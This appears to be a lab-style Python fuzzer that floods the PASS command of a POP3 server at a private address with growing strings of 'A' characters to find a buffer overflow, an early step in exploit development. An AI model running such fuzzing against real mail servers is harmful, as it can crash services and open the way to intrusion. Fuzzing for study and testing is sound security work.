#!/usr/bin/env python
import socket

if __name__ == '__main__':

    buffer = ["A"]
    counter = 100

    while len(buffer) <= 30:
        buffer.append("A" * counter)
        counter += 200

    for string in buffer:
        print("Fuzzing PASS with {0} bytes".format(str(len(string))))

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock_conn = sock.connect(('192.168.193.133', 110))

        data = sock.recv(1024).decode("utf-8")
        print(data)

        buff = ("USER test +\r\n").encode("utf-8")
        sock.send(buff)

        data = sock.recv(1024).decode("utf-8")
        print(data)

        buff = ("PASS " + string + "\r\n").encode("utf-8")
        sock.send(buff)

        data = sock.recv(1024).decode("utf-8")
        print(data)

        sock.close()

